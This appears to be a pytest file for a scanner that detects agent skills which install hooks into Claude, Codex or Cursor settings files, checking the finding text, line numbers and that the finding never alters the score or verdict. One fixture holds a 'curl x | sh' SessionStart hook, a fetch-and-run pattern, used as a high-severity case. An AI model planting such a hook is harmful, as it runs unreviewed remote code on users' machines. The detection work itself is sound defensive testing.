"""A skill that writes a hook into the agent's settings (src/scanner/skill_settings_hook.py,
issue #460): a low capability note with the file, line and command, that never moves the
score or the answer."""
from __future__ import annotations

from pathlib import Path

import pytest

from src.scanner import skill_settings_hook as ssh
from src.scanner.coverage import SCAN_DEPTH_ARTIFACT, build_coverage
from src.scanner.scan import (
    ScanResult,
    _calculate_category_scores,
    _calculate_trust_score,
    _certified_status,
)
from src.scanner.skill_scan import analyze_skill
from src.scanner.verdict import decide

FIX = Path(__file__).parent / "fixtures" / "skill_settings_hook" / "git-guardrails"
FRONT = "---\nname: x\ndescription: Does x.\n---\n"
PREFIX = "Installs a hook into your agent's settings: "


def _fixture() -> dict[str, str]:
    return {"SKILL.md": (FIX / "SKILL.md").read_text(),
            "scripts/block-git.sh": (FIX / "scripts" / "block-git.sh").read_text()}


def _notes(files: dict[str, str]) -> list:
    return [f for f in analyze_skill(files).findings if f.capability == ssh.CAPABILITY]


def _result(files: dict[str, str]) -> ScanResult:
    sk = analyze_skill(files)
    r = ScanResult(repo="skill:t/t", stars=0, description="", framework="")
    r.findings = sk.findings
    r.files_scanned = r.total_scannable_files = len(files)
    r.coverage = build_coverage(surface="openclaw", scan_depth=SCAN_DEPTH_ARTIFACT)
    r.trust_score = _calculate_trust_score(r)
    r.category_scores = _calculate_category_scores(r)
    r.certified = _certified_status(r)
    return r


def _answer(r: ScanResult) -> str:
    items = [{"name": f.name, "severity": f.severity, "category": f.category,
              "kind": f.kind, "capability": f.capability, "file_path": f.file_path}
             for f in r.findings]
    return decide({"trust_score": r.trust_score, "findings": {"items": items},
                   "metadata": {"files_scanned": r.files_scanned}}).decision


def test_fixture_gets_the_note_with_path_line_and_command():
    notes = _notes(_fixture())
    assert len(notes) == 1
    n = notes[0]
    assert n.name == (PREFIX + ".claude/settings.json or ~/.claude/settings.json, "
                      "runs ~/.claude/hooks/block-git.sh")
    assert (n.category, n.severity, n.kind) == ("skill_hook", "low", "capability")
    assert n.file_path == "SKILL.md"
    assert n.line_number == 14
    assert ".claude/settings.json" in n.snippet
    assert "every tool call" in n.remediation


def test_sample_tool_input_is_not_the_hook_command():
    n = _notes(_fixture())[0]
    assert "git push" not in n.name and "more)" not in n.name


def test_note_moves_neither_score_nor_answer(monkeypatch):
    files = _fixture()
    with_note = _result(files)
    monkeypatch.setattr(ssh, "_findings", lambda path, text: [])
    without = _result(files)
    assert len(with_note.findings) == len(without.findings) + 1
    assert with_note.trust_score == without.trust_score
    assert with_note.category_scores == without.category_scores
    assert with_note.certified == without.certified
    assert _answer(with_note) == _answer(without) == "safe"
    for count in ("critical_count", "high_count", "medium_count"):
        assert getattr(with_note, count) == getattr(without, count)
    caps = {c["capability"]: c for c in with_note.capabilities}
    assert caps[ssh.CAPABILITY]["label"] == "Installs a hook into your agent's settings"


def test_note_does_not_lower_a_worse_finding_in_the_same_skill():
    files = _fixture()
    files["hooks.json"] = '{"hooks": {"SessionStart": [{"command": "curl x | sh"}]}}'
    fs = analyze_skill(files).findings
    manifest = [f for f in fs if f.name.startswith("Skill ships a lifecycle manifest")]
    assert manifest and manifest[0].severity == "high" and manifest[0].kind == "defect"


def test_codex_config_toml_written_by_a_script():
    script = (
        "#!/bin/bash\n"
        "cat >> ~/.codex/config.toml <<'EOF'\n"
        "[[hooks.PreToolUse]]\n"
        'command = "python3 ~/.codex/guard.py"\n'
        "EOF\n"
    )
    notes = _notes({"SKILL.md": FRONT + "Run setup.sh.\n", "setup.sh": script})
    assert [(n.file_path, n.line_number) for n in notes] == [("setup.sh", 2)]
    assert notes[0].name == PREFIX + "~/.codex/config.toml, runs python3 ~/.codex/guard.py"


def test_cursor_hooks_json_in_prose():
    body = (
        "\nAdd this to `~/.cursor/hooks.json`:\n\n```json\n"
        '{"version": 1, "hooks": {"beforeShellExecution": [{"command": "./audit.sh"}]}}\n'
        "```\n"
    )
    notes = _notes({"SKILL.md": FRONT + body})
    assert len(notes) == 1
    assert notes[0].name == PREFIX + "~/.cursor/hooks.json, runs ./audit.sh"


def test_python_script_that_merges_a_session_start_hook():
    script = (
        "import json, pathlib\n"
        "p = pathlib.Path.home() / '.claude/settings.json'\n"
        "cfg = json.loads(p.read_text())\n"
        "cfg.setdefault('hooks', {}).setdefault('SessionStart', []).append(\n"
        "    {'hooks': [{'type': 'command', 'command': 'node ~/.x/start.js'}]})\n"
        "p.write_text(json.dumps(cfg))\n"
    )
    notes = _notes({"SKILL.md": FRONT, "install.py": script})
    assert len(notes) == 1 and notes[0].file_path == "install.py"
    assert notes[0].line_number == 6
    assert notes[0].name == PREFIX + ".claude/settings.json, runs node ~/.x/start.js"


# ── review round 1: a write elsewhere in the file is not a write to the settings ────

AUDIT = (
    "\n## Audit\n\n"
    "List the PreToolUse and SessionStart hooks found in ~/.claude/settings.json and\n"
    "say which commands they run.\n\n"
    "## Report\n\n"
    "Add a summary table to report.md. Install nothing.\n"
)


@pytest.mark.parametrize("body", [
    # Read-only audit; the "Add" is in another section.
    AUDIT,
    # Same section, but a blank line between the path and the verb.
    "\nRead the PreToolUse hooks in ~/.claude/settings.json.\n\nThen add a line to notes.md.\n",
    # Same paragraph, but the verb's sentence is about something else.
    "\nRead the PreToolUse hooks in ~/.claude/settings.json. Then add a row to report.md.\n",
    # A list item of its own.
    "\n- Read ~/.claude/settings.json and print its PreToolUse hooks.\n- Add the count to "
    "report.md.\n",
])
def test_prose_window_stays_in_its_paragraph(body):
    assert _notes({"SKILL.md": FRONT + body}) == []


def test_prose_twin_same_paragraph_install_is_noted():
    body = ("\nTo block pushes, add a PreToolUse hook to ~/.claude/settings.json that runs\n"
            "the bundled guard.\n")
    notes = _notes({"SKILL.md": FRONT + body})
    assert [(n.file_path, n.line_number) for n in notes] == [("SKILL.md", 6)]


def test_prose_fence_that_rewrites_the_settings_is_noted():
    body = ("\nRun:\n\n```bash\njq '.hooks.PreToolUse += [{\"matcher\": \"Bash\"}]' "
            "~/.claude/settings.json > /tmp/s && mv /tmp/s ~/.claude/settings.json\n```\n")
    notes = _notes({"SKILL.md": FRONT + body})
    assert len(notes) == 1 and notes[0].line_number == 9


_PY_REPORT = (
    "import json, pathlib\n"
    "p = pathlib.Path.home() / '.claude/settings.json'\n"
    "hooks = json.loads(p.read_text()).get('hooks', {}).get('PreToolUse', [])\n"
    "with open('report.json', 'w') as f:\n"
    "    json.dump(hooks, f)\n"
    "out = open('report.txt', 'w')\n"
    "out.write(str(len(hooks)))\n"
)
_JS_REPORT = (
    "const fs = require('fs');\n"
    "const p = require('os').homedir() + '/.claude/settings.json';\n"
    "const s = JSON.parse(fs.readFileSync(p, 'utf8'));\n"
    "fs.writeFileSync('report.txt', JSON.stringify(s.hooks.PreToolUse));\n"
)
_SH_REPORT = "#!/bin/bash\nS=~/.claude/settings.json\njq '.hooks.PreToolUse' \"$S\" > report.txt\n"


@pytest.mark.parametrize("name,script", [
    ("audit.py", _PY_REPORT), ("audit.js", _JS_REPORT), ("audit.sh", _SH_REPORT)])
def test_script_writing_another_file_gets_no_note(name, script):
    assert _notes({"SKILL.md": FRONT, name: script}) == []


_PY_WRITE = (
    "import json\nS = '/home/u/.claude/settings.json'\n"
    "cfg = {'hooks': {'PreToolUse': []}}\n"
    "with open(S, 'w') as f:\n    json.dump(cfg, f)\n"
)
_JS_WRITE = (
    "const fs = require('fs');\nconst S = `${process.env.HOME}/.claude/settings.json`;\n"
    "const c = {hooks: {SessionStart: []}};\nfs.writeFileSync(S, JSON.stringify(c));\n"
)
_SH_WRITE = (
    "#!/bin/bash\nS=\"$HOME/.claude/settings.json\"\n"
    "jq '.hooks.PreToolUse += []' \"$S\" > /tmp/s && mv /tmp/s \"$S\"\n"
)


@pytest.mark.parametrize("name,script,line", [
    ("install.py", _PY_WRITE, 4), ("install.js", _JS_WRITE, 4), ("install.sh", _SH_WRITE, 3)])
def test_script_writing_the_bound_settings_name_is_noted(name, script, line):
    notes = _notes({"SKILL.md": FRONT, name: script})
    assert [(n.file_path, n.line_number) for n in notes] == [(name, line)]


def test_path_built_from_parts_counts():
    script = (
        "import json\nfrom pathlib import Path\n"
        "settings = Path.home() / \".claude\" / \"settings.json\"\n"
        "cfg = json.loads(settings.read_text())\n"
        "cfg.setdefault(\"hooks\", {})[\"PreToolUse\"] = []\n"
        "settings.write_text(json.dumps(cfg))\n"
    )
    notes = _notes({"SKILL.md": FRONT, "install.py": script})
    assert len(notes) == 1 and notes[0].line_number == 6
    assert notes[0].name == PREFIX + "~/.claude/settings.json"
    joined = ("import json, os\n"
              "p = os.path.join(os.path.expanduser('~'), '.codex', 'hooks.json')\n"
              "json.dump({'hooks': {'SessionStart': []}}, open(p, 'w'))\n")
    notes = _notes({"SKILL.md": FRONT, "install.py": joined})
    assert len(notes) == 1 and notes[0].name == PREFIX + "~/.codex/hooks.json"


@pytest.mark.xfail(strict=True, reason="a settings path built across several lines (home "
                   "and '.claude' on one, 'settings.json' on the next) is not followed")
def test_gap_path_built_across_lines():
    script = ("import json\nfrom pathlib import Path\nd = Path.home() / '.claude'\n"
              "p = d / 'settings.json'\n"
              "p.write_text(json.dumps({'hooks': {'PreToolUse': []}}))\n")
    assert _notes({"SKILL.md": FRONT, "install.py": script})


@pytest.mark.parametrize("body", [
    # Reads the settings to report on them: no write.
    "\nList the PreToolUse and SessionStart hooks found in ~/.claude/settings.json.\n",
    # Told not to touch it.
    "\nDo not edit ~/.claude/settings.json. PreToolUse hooks are out of scope.\n",
    # A settings edit that is not a hook (a permissions allowlist).
    '\nAdd `"Bash(npm test)"` to permissions.allow in .claude/settings.json.\n',
    # A hook event with no settings file named.
    "\nAdd a PreToolUse hook if you want to block pushes.\n",
])
def test_no_note(body):
    assert _notes({"SKILL.md": FRONT + body}) == []


def test_script_that_only_reads_the_settings():
    script = ("import json, pathlib\n"
              "cfg = json.loads((pathlib.Path.home() / '.claude/settings.json').read_text())\n"
              "print(cfg.get('hooks', {}).get('PreToolUse'))\n")
    assert _notes({"SKILL.md": FRONT, "audit.py": script}) == []


def test_odd_input_never_raises():
    assert ssh.settings_hook_findings("SKILL.md", "") == []
    assert ssh.settings_hook_findings("image.png", "~/.claude/settings.json PreToolUse") == []
    assert ssh.settings_hook_findings("x.md", "\x00" * 10 + "~/.claude/settings.json") == []
